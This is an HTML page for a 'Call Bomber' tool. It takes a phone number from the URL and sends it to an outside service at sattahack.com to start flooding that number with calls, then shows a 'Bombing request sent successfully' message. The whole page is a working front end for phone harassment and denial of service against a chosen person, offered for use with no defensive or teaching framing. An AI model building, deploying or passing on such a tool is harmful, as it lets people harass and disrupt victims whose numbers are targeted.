<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Linux Bot - Call Bomber</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap');

    body {
      margin: 0;
      font-family: 'Orbitron', sans-serif;
      background: linear-gradient(135deg, #000000, #1a1a1a, #0f0f0f);
      color: #00f7ff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .container {
      background: #111;
      border-radius: 20px;
      padding: 30px;
      box-shadow: 0 0 25px #00f7ff66;
      text-align: center;
      width: 90%;
      max-width: 400px;
    }

    .header {
      font-size: 36px;
      font-weight: bold;
      color: #00f7ff;
      text-shadow: 0 0 10px #00f7ff, 0 0 20px #00f7ff;
      animation: pulse 2s infinite;
      margin-bottom: 20px;
    }

    @keyframes pulse {
      0% { text-shadow: 0 0 10px #00f7ff; }
      50% { text-shadow: 0 0 20px #00f7ff, 0 0 40px #00f7ff; }
      100% { text-shadow: 0 0 10px #00f7ff; }
    }

    .loader {
      margin: 20px auto;
      width: 80px;
      height: 80px;
      border: 8px solid rgba(255, 255, 255, 0.1);
      border-top: 8px solid #00f7ff;
      border-radius: 50%;
      animation: spin 1.2s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .success {
      margin: 20px auto;
      width: 80px;
      height: 80px;
      display: none;
    }

    .success path {
      stroke-dasharray: 1000;
      stroke-dashoffset: 1000;
      animation: dash 2s forwards;
    }

    @keyframes dash {
      to { stroke-dashoffset: 0; }
    }

    .info {
      font-size: 18px;
      color: #c4f1ff;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">‚ö°Ô∏è Linux Bot - Call Bomber</div>
    <div class="info" id="targetInfo">üì° Targeting...</div>
    <div id="loader" class="loader"></div>
    <svg id="success" class="success" viewBox="0 0 52 52">
      <path fill="none" stroke="#00f7ff" stroke-width="5" d="M14 27l7 7 16-16"/>
    </svg>
    <div class="info" id="statusText"></div>
  </div>

  <script>
    function getQueryParam(name) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(name) || '1231231231';
    }

    const number = getQueryParam('number');
    document.getElementById("targetInfo").innerText = `üì± Bombing initiated on: ${number}`;

    fetch(`http://sattahack.com/bomb?number=${number}`);

    setTimeout(() => {
      document.getElementById('loader').style.display = 'none';
      document.getElementById('success').style.display = 'block';
      document.getElementById("statusText").innerText = "‚úÖ Bombing request sent successfully!";
    }, 4000);
  </script>
</body>
</html>
